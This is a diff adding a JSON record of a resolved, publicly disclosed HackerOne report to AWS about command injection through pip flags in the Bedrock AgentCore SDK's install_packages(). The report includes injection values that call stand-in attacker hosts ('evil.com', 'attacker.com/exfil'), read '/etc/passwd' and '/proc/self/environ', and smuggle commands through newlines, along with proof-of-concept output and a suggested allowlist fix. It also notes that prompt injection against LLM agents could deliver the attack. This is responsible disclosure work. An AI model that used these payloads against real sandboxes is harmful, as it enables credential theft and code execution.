@@ -1,0 +1,124 @@
+{
+  "id": 3633123,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjMzMTIz",
+  "url": "https://hackerone.com/reports/3633123",
+  "title": " Incomplete Input Sanitization in CodeInterpreter install_packages Allows Command Injection via pip Flags",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-28T01:16:15.932Z",
+  "submitted_at": "2026-03-28T01:16:16.546Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mistercloudsec",
+    "url": "/mistercloudsec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/917j8f4yrcgxs0qgzm8qdbybo073/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 84809,
+    "url": "https://hackerone.com/aws_vdp",
+    "handle": "aws_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "AWS VDP",
+      "twitter_handle": "amazon",
+      "website": "https://aws.amazon.com/",
+      "about": "Amazon Web Services (AWS) is a secure cloud services platform, offering compute power and other functionality to help businesses scale and grow. "
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-12530"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-09-16T20:57:22.668Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-16T19:53:51.908Z",
+  "team_member_agreed_on_going_public_at": "2026-09-16T20:57:22.318Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report to Amazon Web Services! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\n**Description:** The `install_packages()` method in the Bedrock AgentCore Python SDK (https://github.com/aws/bedrock-agentcore-sdk-python) implements a blocklist-based sanitization for package names that is incomplete. Several injection vectors bypass the blocklist, most critically pip's `--index-url` flag, which allows redirecting package resolution to an attacker-controlled PyPI server. This enables arbitrary code execution within the Code Interpreter sandbox.\n\n**File:** `src/bedrock_agentcore/tools/code_interpreter_client.py`, lines 588-598\n\n```python\n# Sanitize package names (basic validation)\nfor pkg in packages:\n    if any(char in pkg for char in [\";\", \"&\", \"|\", \"`\", \"$\"]):\n        raise ValueError(f\"Invalid characters in package name: {pkg}\")\n\npackages_str = \" \".join(packages)\nupgrade_flag = \"--upgrade \" if upgrade else \"\"\ncommand = f\"pip install {upgrade_flag}{packages_str}\"\n\nself.logger.info(\"Installing packages: %s\", packages_str)\nreturn self.invoke(\"executeCommand\", {\"command\": command})\n```\n\nThe blocklist checks for `;`, `&`, `|`, `` ` ``, and `$`, but does not block:\n\n1. **`--index-url` / `-i` flag injection**: Characters `-`, `/`, `:`, `.` are all allowed. A \"package name\" like `--index-url https://evil.com/simple/ malicious-package` passes validation and tells pip to fetch packages from an attacker-controlled server.\n2. **Newline injection (`\\n`)**: Not in the blocklist. A package name like `\"pandas\\ncurl http://attacker.com/exfil\"` injects a second command.\n3. **`-r` flag injection**: `\"-r /etc/passwd\"` causes pip to attempt to read a local file as a requirements file, leaking its contents through error messages.\n\nAffected versions: `bedrock-agentcore-sdk-python` all versions through at least v1.4.8.\n\n## Steps To Reproduce:\n\n**Prerequisites:**\n- AWS account with Bedrock AgentCore access (any authenticated user, no special permissions required). The vulnerability exists in every Code Interpreter session.\n- `bedrock-agentcore` SDK installed (`pip install bedrock-agentcore`) to run the PoC script. The SDK is not required for the vulnerability itself. The same `install_packages()` method is available in any Code Interpreter session, including via the AWS Console or any application built with the SDK.\n\n**1. Run the attached PoC script `demo-pip-injection.py`:**\n\n```bash\npython3 demo-pip-injection.py\n```\n\nThe script demonstrates three steps:\n1. Shell injection with `;` is correctly blocked by the blocklist\n2. `-r /etc/passwd` bypasses the blocklist -- pip reads the file and leaks contents in error messages\n3. `-r /proc/self/environ` escalates to leak all sandbox environment variables (internal paths, ports, service config)\n\n**2. Observe the output (see attached recording):**\n\n```\nSTEP 1: Blocklist correctly blocks shell injection\n  Blocked: Invalid characters in package name: pandas; curl http://evil.com\n\nSTEP 2: Bypass blocklist -- read /etc/passwd via -r flag\n  ERROR: Invalid requirement: 'root:x:0:0:root:/root:/bin/bash'\n\nSTEP 3: Escalate -- read /proc/self/environ for secrets\n  TOOLS_SERVER_LOG_LEVEL=info\n  PLATFORM_SERVER_HOST=127.0.0.1\n  PLATFORM_SERVER_PORT=48620\n  TOOLS_SERVER_PORT=8080\n```\n\n### Additional vectors (not in PoC script)\n\n**`--index-url` bypass (SSRF / malicious package install):**\n```python\n# Redirects pip to an attacker-controlled PyPI server\ncode_client.install_packages([\"--index-url\", \"https://attacker.example.com/simple/\", \"malicious-package\"])\n# Confirmed via interactsh: DNS requests from AWS Code Interpreter IPs\n```\n\n**Newline injection (command injection):**\n```python\ncode_client.install_packages([\"pandas\\nid\"])\n# The 'id' command executes separately after pip install\n```\n\n**Attachments:**\n- `demo-pip-injection.py` -- Full PoC script\n- Terminal recording showing the complete exploit\n\n## Impact\n\n## Summary:\nAn attacker who can influence the arguments to `install_packages()`, for example through prompt injection against an LLM agent that uses Code Interpreter, can:\n\n1. **Read arbitrary files from the sandbox** via pip's `-r` flag. Confirmed: `/etc/passwd` and `/proc/self/environ` contents leaked through pip error messages. The environment variables exposed internal sandbox architecture including `genesis1p-tools` paths, internal service ports (48620, 8080), and process configuration. On sandboxes with IAM roles, `/proc/self/environ` would leak `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`.\n2. **Redirect package resolution** to a malicious PyPI mirror via `--index-url`. Confirmed: DNS requests from AWS Code Interpreter IPs (████████, ████████) reached an interactsh OOB server, proving the sandbox connected to an attacker-controlled server.\n3. **Execute arbitrary commands** in the Code Interpreter sandbox via newline injection\n\n## Root Cause\n\nThe blocklist at lines 588-598 checks for shell metacharacters (`;`, `&`, `|`, `` ` ``, `$`) but does not account for pip's own flag syntax. Since the validated strings are concatenated directly into a `pip install` command, any pip flag that uses only alphanumeric characters, hyphens, slashes, and dots bypasses the blocklist.\n\n## Recommended Fix\n\nReplace the incomplete blocklist with an allowlist approach:\n\n```python\nimport re\n\nVALID_PACKAGE_NAME = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?(\\[.*\\])?(==|>=|<=|!=|~=|>|<)?[a-zA-Z0-9.*]*$')\n\nfor pkg in packages:\n    if not VALID_PACKAGE_NAME.match(pkg):\n        raise ValueError(f\"Invalid package name: {pkg}\")\n```\n\nThis ensures only valid PyPI package names (with optional version specifiers) are accepted, blocking all flag injection and command injection vectors.\n\n## Disclosure\n\nFor awareness, we plan to publish a blog post detailing these findings after remediation. We are happy to share a draft ahead of publication and coordinate on timing.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "score": 7.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 741710,
+    "asset_type": "OTHER",
+    "asset_identifier": "Amazon Bedrock",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
